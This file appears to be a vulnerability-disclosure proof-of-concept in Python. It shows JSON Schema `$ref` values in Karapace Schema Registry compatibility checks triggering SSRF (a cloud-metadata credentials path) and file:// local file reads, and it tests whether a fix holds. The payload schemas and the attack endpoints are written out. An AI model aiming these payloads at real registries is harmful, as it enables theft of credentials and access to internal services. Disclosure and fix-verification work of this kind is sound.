#!/usr/bin/env python3
"""
PoC: Server-Side Request Forgery + local file read via JSON Schema `$ref` in Karapace
Schema Registry compatibility checking (CWE-918).

When Karapace checks JSON Schema compatibility it normalizes both schemas, and for every
`$ref` it calls the legacy jsonschema RefResolver:

    src/karapace/core/compatibility/jsonschema/utils.py :: normalize_schema_rec
        resolved_scope, resolved_schema = resolver.resolve(ref)   # legacy _RefResolver

The legacy RefResolver dereferences absolute URIs by fetching them:
  - http(s)://…  -> an outbound HTTP request from the Schema Registry host (SSRF; can reach
                    internal services and cloud metadata such as 169.254.169.254)
  - file://…     -> reads a local file (arbitrary local file read)

The attacker fully controls the schema (and thus the `$ref`) via:
  - POST /compatibility/subjects/{subject}/versions/{version}   (needs only Read on subject)
  - POST /subjects/{subject}/versions                           (needs Write; registration
                                                                  runs the same compat check)
with the default BACKWARD compatibility and at least one existing version to compare against.

This script drives the REAL Karapace code (parse_jsonschema_definition + normalize_schema)
and demonstrates both primitives. It stubs only native/otel modules the normalization path
does not use, so it runs in a bare checkout.

Usage:
    PYTHONPATH=src python3 poc/karapace_jsonschema_ssrf_poc.py
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import threading
import types
import warnings
from http.server import BaseHTTPRequestHandler, HTTPServer

warnings.simplefilter("ignore")


def _install_stubs_for_bare_env() -> None:
    def stub(name, **attrs):
        m = types.ModuleType(name)
        for k, v in attrs.items():
            setattr(m, k, v)
        sys.modules[name] = m

    stub("karapace.core.stats", StatsClient=type("StatsClient", (), {}))
    stub("karapace.core.protobuf.protopace")
    stub(
        "karapace.core.protobuf.protopace.protopace",
        Proto=type("Proto", (), {}),
        IncompatibleError=type("IncompatibleError", (Exception,), {}),
        check_compatibility=lambda *a, **k: None,
        format_proto=lambda *a, **k: None,
    )


try:
    from karapace.core.compatibility.jsonschema.utils import normalize_schema
    from karapace.core.schema_models import parse_jsonschema_definition
except (ImportError, FileNotFoundError):
    _install_stubs_for_bare_env()
    from karapace.core.compatibility.jsonschema.utils import normalize_schema
    from karapace.core.schema_models import parse_jsonschema_definition


def demo_local_file_read() -> bool:
    canary = "CANARY_local_file_read_proof"
    with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as fh:
        # A real target would be a Kafka/TLS credential file; JSON content is used only so the
        # fetched bytes parse and surface in the normalized schema.
        json.dump({"stolen_secret": canary}, fh)
        secret_path = fh.name
    try:
        schema = json.dumps({"type": "object", "properties": {"x": {"$ref": f"file://{secret_path}"}}})
        validator = parse_jsonschema_definition(schema)
        print("[file://] attacker schema $ref -> ", f"file://{secret_path}")
        try:
            normalized = json.dumps(normalize_schema(validator))
        except Exception as exc:  # fixed build refuses the external ref before reading the file
            normalized = ""
            print("[file://] refused by registry:", type(exc).__name__, "-", exc)
        leaked = canary in normalized
        if normalized:
            print("[file://] normalized schema     -> ", normalized)
        print(f"[file://] local file content read: {leaked}")
        return leaked
    finally:
        os.unlink(secret_path)


def demo_ssrf() -> bool:
    hits: list[str] = []

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append(self.path)
            body = json.dumps({"internal": "reached", "path": self.path}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    server = HTTPServer(("127.0.0.1", 0), Handler)
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        # Stands in for an internal-only service / cloud metadata endpoint.
        ref = f"http://127.0.0.1:{port}/latest/meta-data/iam/security-credentials/"
        schema = json.dumps({"type": "object", "properties": {"x": {"$ref": ref}}})
        validator = parse_jsonschema_definition(schema)
        print("[http://] attacker schema $ref -> ", ref)
        try:
            normalize_schema(validator)
        except Exception as exc:  # fixed build refuses the external ref before the request
            print("[http://] refused by registry:", type(exc).__name__, "-", exc)
        print("[http://] requests received by the internal service:", hits)
        return len(hits) > 0
    finally:
        server.shutdown()


def main() -> int:
    print("== Local file read (file://) ==")
    lfr = demo_local_file_read()
    print()
    print("== SSRF (http://) ==")
    ssrf = demo_ssrf()
    print()
    if lfr or ssrf:
        print("RESULT: VULNERABLE — JSON Schema $ref is dereferenced by the Schema Registry")
        print(f"        (local file read: {lfr}, outbound SSRF: {ssrf}).")
        return 1
    print("RESULT: SAFE — $ref is not externally dereferenced.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
